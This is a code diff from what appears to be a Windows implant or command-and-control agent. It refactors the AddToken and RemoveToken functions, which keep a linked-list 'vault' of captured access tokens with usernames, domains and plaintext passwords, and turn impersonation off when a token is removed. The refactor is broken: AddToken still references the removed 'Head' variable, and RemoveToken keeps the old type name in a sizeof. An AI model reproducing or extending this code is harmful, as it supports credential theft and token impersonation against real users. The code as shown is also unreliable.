@@ -124,107 +124,107 @@ namespace Token {
 		return head;
 	}
 
-	DWORD AddToken(HANDLE hToken, LPWSTR Username, SHORT Type, DWORD Pid, LPWSTR DomainUser, LPWSTR Domain, LPWSTR Password) {
+	DWORD AddToken(HANDLE token, LPWSTR username, SHORT type, DWORD pid, LPWSTR domain_user, LPWSTR domain, LPWSTR password) {
 		HEXANE
 
-		PTOKEN_LIST_DATA Head	= { };
-		PTOKEN_LIST_DATA Entry	= { };
+		_token_list_data *head	= { };
+		_token_list_data *entry	= { };
 		DWORD Index				= 0;
 
-		Entry = R_CAST(PTOKEN_LIST_DATA, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(TOKEN_LIST_DATA)));
+		entry = R_CAST(_token_list_data*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(_token_list_data)));
 
-		Entry->Handle		= hToken;
-		Entry->lpUser		= Username;
-		Entry->dwProcessID	= Pid;
-		Entry->Type			= Type;
-		Entry->DomainUser	= DomainUser;
-		Entry->lpDomain		= Domain;
-		Entry->lpPassword	= Password;
-		Entry->Next			= nullptr;
+		entry->Handle		= token;
+		entry->lpUser		= username;
+		entry->dwProcessID	= pid;
+		entry->Type			= type;
+		entry->DomainUser	= domain_user;
+		entry->lpDomain		= domain;
+		entry->lpPassword	= password;
+		entry->Next			= nullptr;
 
 		if (Ctx->Tokens.Vault == nullptr) {
-			Ctx->Tokens.Vault = Entry;
+			Ctx->Tokens.Vault = entry;
 			return Index;
 		}
 
-		Head = Ctx->Tokens.Vault;
-		while (Head->Next) {
-			Head = Head->Next;
+		head = Ctx->Tokens.Vault;
+		while (head->Next) {
+			head = Head->Next;
 			Index++;
 		}
 
-		Head->Next = Entry;
+		head->Next = entry;
 		Index++;
 
 		return Index;
 	}
 
-	BOOL RemoveToken(DWORD tokenId) {
+	BOOL RemoveToken(const uint32_t token_id) {
 		HEXANE
 
-		PTOKEN_LIST_DATA Head	= Ctx->Tokens.Vault;
-		PTOKEN_LIST_DATA Entry	= GetToken(tokenId);
-		PTOKEN_LIST_DATA Prev	= { };
+		_token_list_data *head	= Ctx->Tokens.Vault;
+		_token_list_data *entry	= GetToken(token_id);
+		_token_list_data *prev	= { };
 
-		if (!Entry) {
+		if (!entry) {
 			return FALSE;
 		}
 
-		while (Head) {
-			if (Head == Entry) {
-				if (Head == Ctx->Tokens.Vault) {
-					Ctx->Tokens.Vault = Entry->Next;
+		while (head) {
+			if (head == entry) {
+				if (head == Ctx->Tokens.Vault) {
+					Ctx->Tokens.Vault = entry->Next;
 
 				} else {
-					Prev = Ctx->Tokens.Vault;
-					while (Prev && Prev->Next != Entry) {
-						Prev = Prev->Next;
+					prev = Ctx->Tokens.Vault;
+					while (prev && prev->Next != entry) {
+						prev = prev->Next;
 					}
-					if (Prev) {
-						Prev->Next = Entry->Next;
+					if (prev) {
+						prev->Next = entry->Next;
 					}
 				}
 
-				if (Ctx->Tokens.Impersonate && Ctx->Tokens.Token->Handle == Entry->Handle) {
+				if (Ctx->Tokens.Impersonate && Ctx->Tokens.Token->Handle == entry->Handle) {
 					TokenImpersonate(FALSE);
 				}
 
-				if (Entry->Handle) {
-					Ctx->Nt.NtClose(Entry->Handle);
-					Entry->Handle = nullptr;
+				if (entry->Handle) {
+					Ctx->Nt.NtClose(entry->Handle);
+					entry->Handle = nullptr;
 				}
 
-				if (Entry->DomainUser) {
-					x_memset(Entry->DomainUser, 0, x_wcslen(Entry->DomainUser) * sizeof(WCHAR));
-					Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, Entry->DomainUser);
-					Entry->DomainUser = nullptr;
+				if (entry->DomainUser) {
+					x_memset(entry->DomainUser, 0, x_wcslen(entry->DomainUser) * sizeof(WCHAR));
+					Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, entry->DomainUser);
+					entry->DomainUser = nullptr;
 				}
 
-				if (Entry->lpUser) {
-					x_memset(Entry->lpUser, 0, x_wcslen(Entry->lpUser) * sizeof(WCHAR));
-					Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, Entry->lpUser);
-					Entry->lpUser = nullptr;
+				if (entry->lpUser) {
+					x_memset(entry->lpUser, 0, x_wcslen(entry->lpUser) * sizeof(WCHAR));
+					Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, entry->lpUser);
+					entry->lpUser = nullptr;
 				}
 
-				if (Entry->lpDomain) {
-					x_memset(Entry->lpDomain, 0, x_wcslen(Entry->lpDomain) * sizeof(WCHAR));
-					Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, Entry->lpDomain);
-					Entry->lpDomain = nullptr;
+				if (entry->lpDomain) {
+					x_memset(entry->lpDomain, 0, x_wcslen(entry->lpDomain) * sizeof(WCHAR));
+					Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, entry->lpDomain);
+					entry->lpDomain = nullptr;
 				}
 
-				if (Entry->lpPassword) {
-					x_memset(Entry->lpPassword, 0, x_wcslen(Entry->lpPassword) * sizeof(WCHAR));
-					Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, Entry->lpPassword);
-					Entry->lpPassword = nullptr;
+				if (entry->lpPassword) {
+					x_memset(entry->lpPassword, 0, x_wcslen(entry->lpPassword) * sizeof(WCHAR));
+					Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, entry->lpPassword);
+					entry->lpPassword = nullptr;
 				}
 
-				x_memset(Entry, 0, sizeof(TOKEN_LIST_DATA));
-				Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, Entry);
+				x_memset(entry, 0, sizeof(TOKEN_LIST_DATA));
+				Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, entry);
 
 				return TRUE;
 			}
 
-			Head = Head->Next;
+			head = head->Next;
 		}
 
 		return FALSE;
